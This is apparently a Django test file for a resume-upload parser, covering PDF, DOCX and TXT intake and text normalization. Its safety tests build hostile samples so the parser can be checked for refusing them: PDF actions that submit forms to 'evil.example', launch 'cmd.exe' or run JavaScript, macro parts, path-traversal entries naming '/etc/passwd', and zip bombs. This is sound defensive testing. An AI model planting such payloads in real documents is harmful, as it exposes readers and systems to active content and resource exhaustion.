"""Document intake and normalization (rules D1-D11, N1-N7)."""
import io
import zipfile
from unittest import mock

from django.test import SimpleTestCase, override_settings

from apps.accounts.importing.documents import (
    DocumentError,
    bullet_of,
    normalize_text,
    read_document,
    strip_bullet,
)

BODY = [
    "Jane Doe",
    "Backend Engineer with eight years of experience building reliable services",
    "Acme Corporation - Senior Software Engineer Jan 2020 - Present",
    "Designed and operated payment systems handling millions of requests per day",
    "Led a team of five engineers and mentored several junior developers",
    "Skills: Python, Django, PostgreSQL, Kubernetes, Docker, Terraform, AWS",
]


def build_pdf(lines=BODY, *, pages=1, catalog_extra=b"", page_extra=b"", extra_objects=()):
    """A small real PDF with text, built by hand so the catalog, pages and
    annotations can be varied exactly."""
    content = "BT /F1 11 Tf 72 740 Td 14 TL " + " ".join(
        "(" + line.replace("\\", "\\\\").replace("(", "\\(").replace(")", "\\)") + ") Tj T*" for line in lines
    ) + " ET"
    content = content.encode()
    first_page = 5
    objects = [
        b"<< /Type /Catalog /Pages 2 0 R " + catalog_extra + b" >>",
        ("<< /Type /Pages /Kids [" + " ".join(f"{first_page + i} 0 R" for i in range(pages)) + f"] /Count {pages} >>").encode(),
        b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>",
        f"<< /Length {len(content)} >>\nstream\n".encode() + content + b"\nendstream",
    ]
    for _ in range(pages):
        objects.append(
            b"<< /Type /Page /Parent 2 0 R /Resources << /Font << /F1 3 0 R >> >> "
            b"/MediaBox [0 0 612 792] /Contents 4 0 R " + page_extra + b" >>"
        )
    objects.extend(extra_objects)
    buf = io.BytesIO()
    buf.write(b"%PDF-1.4\n")
    offsets = []
    for number, obj in enumerate(objects, start=1):
        offsets.append(buf.tell())
        buf.write(f"{number} 0 obj\n".encode() + obj + b"\nendobj\n")
    xref = buf.tell()
    buf.write(f"xref\n0 {len(objects) + 1}\n0000000000 65535 f \n".encode())
    for offset in offsets:
        buf.write(f"{offset:010d} 00000 n \n".encode())
    buf.write(f"trailer\n<< /Size {len(objects) + 1} /Root 1 0 R >>\nstartxref\n{xref}\n%%EOF\n".encode())
    return buf.getvalue()


def build_docx(lines=BODY):
    from docx import Document

    document = Document()
    for line in lines:
        document.add_paragraph(line)
    table = document.add_table(rows=1, cols=2)
    table.rows[0].cells[0].text = "Languages"
    table.rows[0].cells[1].text = "English, Hindi"
    out = io.BytesIO()
    document.save(out)
    return out.getvalue()


def rezip(data, add=()):
    out = io.BytesIO()
    with zipfile.ZipFile(io.BytesIO(data)) as source, zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as target:
        for info in source.infolist():
            target.writestr(info.filename, source.read(info.filename))
        for name, payload in add:
            target.writestr(name, payload)
    return out.getvalue()


def code_of(data, ext):
    try:
        read_document(data, ext)
    except DocumentError as exc:
        return exc.code
    return None


class IntakeTests(SimpleTestCase):
    def test_D1_a_text_pdf_docx_and_txt_are_read(self):
        pdf = read_document(build_pdf(), ".pdf")
        self.assertIn("Backend Engineer", pdf.text)
        self.assertEqual((pdf.kind, pdf.pages), ("pdf", 1))
        docx = read_document(build_docx(), ".docx")
        self.assertIn("Backend Engineer", docx.text)
        self.assertIn("English, Hindi", docx.text)  # table cells are read
        txt = read_document("\n".join(BODY).encode(), ".txt")
        self.assertEqual(txt.kind, "txt")

    def test_D1_other_extensions_are_refused_and_case_is_ignored(self):
        for ext in (".doc", ".exe", ".html", ".rtf", "", None):
            with self.subTest(ext=ext):
                self.assertEqual(code_of(build_pdf(), ext), "unsupported_type")
        self.assertIsNone(code_of(build_pdf(), ".PDF"))

    def test_D1_the_content_must_match_the_extension(self):
        self.assertEqual(code_of(build_docx(), ".pdf"), "not_a_pdf")
        self.assertEqual(code_of(b"<html>" + b"x" * 400, ".pdf"), "not_a_pdf")
        self.assertEqual(code_of(build_pdf(), ".docx"), "docx_invalid")
        self.assertEqual(code_of(b"not a zip" * 100, ".docx"), "docx_invalid")

    def test_D1_txt_must_be_strict_utf8_without_nul_bytes(self):
        text = "\n".join(BODY)
        self.assertIsNone(code_of(b"\xef\xbb\xbf" + text.encode(), ".txt"))  # BOM is fine
        self.assertEqual(code_of(text.encode("latin-1") + "é".encode("latin-1"), ".txt"), "txt_unreadable")
        self.assertEqual(code_of(text.encode() + b"\x00", ".txt"), "txt_unreadable")

    def test_D2_empty_and_oversized_files_are_refused(self):
        self.assertEqual(code_of(b"", ".pdf"), "empty_file")
        with override_settings(PROFILE_IMPORT_MAX_PDF_BYTES=300):
            self.assertEqual(code_of(build_pdf(), ".pdf"), "file_too_large")
            self.assertEqual(code_of(b"x" * 301, ".txt"), "file_too_large")

    def test_D6_a_file_with_almost_no_text_is_refused_and_never_ocrd(self):
        self.assertEqual(code_of(build_pdf(["Jane Doe", "Engineer"]), ".pdf"), "no_text_found")
        self.assertEqual(code_of(b"short", ".txt"), "no_text_found")


class PdfSafetyTests(SimpleTestCase):
    def test_D3_encrypted_pdfs_are_refused_even_with_an_empty_user_password(self):
        from pypdf import PdfReader, PdfWriter

        for user_password in ("secret", ""):
            with self.subTest(user_password=user_password):
                writer = PdfWriter(clone_from=PdfReader(io.BytesIO(build_pdf())))
                writer.encrypt(user_password=user_password, owner_password="owner")
                out = io.BytesIO()
                writer.write(out)
                self.assertEqual(code_of(out.getvalue(), ".pdf"), "pdf_encrypted")

    def test_D3_more_than_ten_pages_is_refused_ten_is_fine(self):
        self.assertEqual(code_of(build_pdf(pages=11), ".pdf"), "pdf_too_long")
        self.assertIsNone(code_of(build_pdf(pages=10), ".pdf"))
        with override_settings(PROFILE_IMPORT_MAX_PAGES=2):
            self.assertEqual(code_of(build_pdf(pages=3), ".pdf"), "pdf_too_long")

    def test_D3_a_damaged_pdf_is_unreadable_not_a_crash(self):
        self.assertEqual(code_of(b"%PDF-1.4\n" + b"garbage " * 100, ".pdf"), "pdf_unreadable")

    def test_D4_a_bare_view_destination_open_action_is_accepted(self):
        """LaTeX/hyperref writes this; 29 of 81 real resumes carry one."""
        for extra in (
            b"/OpenAction [5 0 R /Fit]",
            b"/OpenAction [5 0 R /XYZ null null null]",
            b"/OpenAction << /S /GoTo /D [5 0 R /Fit] >>",
        ):
            with self.subTest(extra=extra):
                self.assertIsNone(code_of(build_pdf(catalog_extra=extra), ".pdf"))

    def test_D4_a_link_annotation_with_a_uri_action_is_accepted(self):
        link = b"<< /Type /Annot /Subtype /Link /Rect [0 0 10 10] /A << /S /URI /URI (https://example.com) >> >>"
        data = build_pdf(page_extra=b"/Annots [6 0 R]", extra_objects=[link])
        self.assertIsNone(code_of(data, ".pdf"))

    def test_D4_actions_that_run_code_are_refused_by_the_object_walk(self):
        """/SubmitForm has no raw-token backstop, so these exercise the object walk."""
        cases = {
            "open action": dict(catalog_extra=b"/OpenAction << /S /SubmitForm /F (https://evil.example) >>"),
            "document additional actions": dict(catalog_extra=b"/AA << /WC << /S /SubmitForm /F (x) >> >>"),
            "chained next action": dict(
                catalog_extra=b"/OpenAction << /S /GoTo /D [5 0 R /Fit] /Next << /S /ImportData /F (x) >> >>"
            ),
            "page additional actions": dict(page_extra=b"/AA << /O << /S /SubmitForm /F (x) >> >>"),
            "annotation action": dict(
                page_extra=b"/Annots [6 0 R]",
                extra_objects=[b"<< /Type /Annot /Subtype /Link /Rect [0 0 1 1] /A << /S /SubmitForm /F (x) >> >>"],
            ),
        }
        for label, kwargs in cases.items():
            with self.subTest(label):
                self.assertEqual(code_of(build_pdf(**kwargs), ".pdf"), "pdf_active_content")

    def test_D4_javascript_launch_embedded_files_and_xfa_are_refused(self):
        cases = {
            "javascript": b"/OpenAction << /S /JavaScript /JS (app.alert\\(1\\)) >>",
            "launch": b"/OpenAction << /S /Launch /F (cmd.exe) >>",
            "embedded files": b"/Names << /EmbeddedFiles << /Names [] >> >>",
            "xfa": b"/AcroForm << /XFA [] >>",
        }
        for label, extra in cases.items():
            with self.subTest(label):
                self.assertEqual(code_of(build_pdf(catalog_extra=extra), ".pdf"), "pdf_active_content")

    def test_D4_the_raw_byte_backstop_catches_a_token_hidden_after_the_trailer(self):
        self.assertEqual(code_of(build_pdf() + b"\n%/JavaScript", ".pdf"), "pdf_active_content")


class DocxSafetyTests(SimpleTestCase):
    def test_D5_macros_are_refused(self):
        data = rezip(build_docx(), add=[("word/vbaProject.bin", b"x")])
        self.assertEqual(code_of(data, ".docx"), "docx_macros")

    def test_D5_path_traversal_names_are_refused(self):
        for name in ("../evil.xml", "/etc/passwd", "word/../../x"):
            with self.subTest(name=name):
                self.assertEqual(code_of(rezip(build_docx(), add=[(name, b"x")]), ".docx"), "docx_unsafe")

    def test_D5_too_many_entries_is_refused(self):
        data = rezip(build_docx(), add=[(f"word/extra{i}.xml", b"x") for i in range(205)])
        self.assertEqual(code_of(data, ".docx"), "docx_too_complex")

    def test_D5_a_zip_bomb_is_refused_by_total_size_and_by_ratio(self):
        huge = rezip(build_docx(), add=[("word/media/big.bin", b"\x00" * (21 * 1024 * 1024))])
        self.assertEqual(code_of(huge, ".docx"), "docx_too_large")
        dense = rezip(build_docx(), add=[("word/media/dense.bin", b"\x00" * (2 * 1024 * 1024))])
        self.assertEqual(code_of(dense, ".docx"), "docx_too_large")

    def test_D5_a_small_repetitive_part_is_not_a_bomb(self):
        data = rezip(build_docx(), add=[("word/media/small.bin", b"\x00" * 100_000)])
        self.assertIsNone(code_of(data, ".docx"))

    def test_D5_a_zip_without_a_document_part_is_invalid(self):
        out = io.BytesIO()
        with zipfile.ZipFile(out, "w") as archive:
            archive.writestr("hello.txt", "x" * 500)
        self.assertEqual(code_of(out.getvalue(), ".docx"), "docx_invalid")


class ErrorHygieneTests(SimpleTestCase):
    def test_D11_parser_exception_text_never_escapes(self):
        secret = "SECRET-RESUME-CONTENT"
        with mock.patch("pypdf.PdfReader", side_effect=ValueError(secret)):
            with self.assertRaises(DocumentError) as caught:
                read_document(build_pdf(), ".pdf")
        error = caught.exception
        self.assertEqual(error.code, "pdf_unreadable")
        self.assertNotIn(secret, str(error))
        self.assertNotIn(secret, repr(error))
        self.assertTrue(error.__suppress_context__)  # no chained traceback with the text

    def test_D11_docx_parser_exception_text_never_escapes(self):
        secret = "SECRET-RESUME-CONTENT"
        data = build_docx()  # built before the parser is patched
        with mock.patch("docx.Document", side_effect=ValueError(secret)):
            with self.assertRaises(DocumentError) as caught:
                read_document(data, ".docx")
        self.assertEqual(caught.exception.code, "docx_unreadable")
        self.assertNotIn(secret, str(caught.exception))

    def test_a_page_that_fails_to_extract_does_not_fail_the_file(self):
        from pypdf import PageObject

        real = PageObject.extract_text
        calls = {"n": 0}

        def flaky(self, *args, **kwargs):
            calls["n"] += 1
            if calls["n"] == 1:
                raise ValueError("bad page")
            return real(self, *args, **kwargs)

        with mock.patch.object(PageObject, "extract_text", flaky):
            document = read_document(build_pdf(pages=2), ".pdf")
        self.assertIn("Backend Engineer", document.text)


class NormalizeTests(SimpleTestCase):
    def test_N1_nfkc_ligatures_invisible_characters_and_cid_artifacts(self):
        raw = "ﬁnance team​ (cid:123)  Ｐｙｔｈｏｎ\x00"
        self.assertEqual(normalize_text(raw).text, "finance team Python")

    def test_N2_whitespace_and_blank_lines(self):
        result = normalize_text("  a \t b  \r\n\n\n\n\nnext   line \r last")
        self.assertEqual(result.lines, ("a b", "", "next line", "last"))

    def test_N3_lines_are_not_reflowed_or_dehyphenated(self):
        result = normalize_text("exam-\nple of a wrapped\nline")
        self.assertEqual(result.lines, ("exam-", "ple of a wrapped", "line"))

    def test_N4_bullets_are_recognized_and_stripped(self):
        for glyph in "•●▪■◦○∙·‣⁃▸►":
            with self.subTest(glyph=glyph):
                self.assertEqual(bullet_of(f"  {glyph} Built a thing"), glyph)
                self.assertEqual(strip_bullet(f"{glyph}   Built a thing"), "Built a thing")
        self.assertEqual(bullet_of("- Built a thing"), "-")
        self.assertEqual(bullet_of("* Built a thing"), "*")
        self.assertEqual(strip_bullet("- Built a thing"), "Built a thing")

    def test_N4_a_hyphen_or_dash_that_is_not_a_bullet_is_left_alone(self):
        for line in ("-5 years", "–Dash", "Acme - Engineer", "Plain text"):
            with self.subTest(line=line):
                self.assertIsNone(bullet_of(line))
                self.assertEqual(strip_bullet(line), line)

    def test_N5_text_is_capped_at_a_line_boundary_and_flagged(self):
        with override_settings(PROFILE_IMPORT_MAX_TEXT_CHARS=50):
            result = normalize_text("\n".join(["x" * 20] * 5))
        self.assertTrue(result.truncated)
        self.assertEqual(result.lines, ("x" * 20, "x" * 20))
        self.assertFalse(normalize_text("short").truncated)

    def test_N6_long_lines_are_kept_in_the_text(self):
        long_line = "word " * 100
        result = normalize_text(f"head\n{long_line}\ntail")
        self.assertEqual(len(result.lines), 3)
        self.assertGreater(len(result.lines[1]), 300)

    def test_N7_a_line_repeated_three_times_is_noise_after_its_first_occurrence(self):
        lines = ["Jane Doe Resume", "body one", "Jane Doe Resume", "body two", "Jane Doe Resume"]
        result = normalize_text("\n".join(lines))
        self.assertEqual(sorted(result.noise), [2, 4])

    def test_N7_two_repeats_short_lines_and_case_variants(self):
        self.assertEqual(normalize_text("Jane Doe\nx\nJane Doe").noise, frozenset())
        self.assertEqual(normalize_text("AB\nAB\nAB\nAB").noise, frozenset())  # under 6 chars
        self.assertEqual(sorted(normalize_text("Page One\npage one\nPAGE ONE\nbody").noise), [1, 2])
